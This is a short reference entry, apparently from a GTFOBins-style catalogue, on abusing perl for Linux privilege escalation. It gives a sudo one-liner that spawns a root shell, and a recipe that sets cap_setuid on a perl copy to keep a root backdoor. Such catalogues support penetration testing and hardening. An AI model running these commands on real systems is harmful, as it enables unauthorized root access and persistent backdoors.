***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo perl -e 'exec "/bin/sh";'
***** Capabilities *****
It can manipulate its process UID and can be used on Linux as a backdoor to
maintain elevated privileges with the CAP_SETUID capability set. This also
works when executed by another binary with the capability set.
    * cp $(which perl) .
      sudo setcap cap_setuid+ep perl

      ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
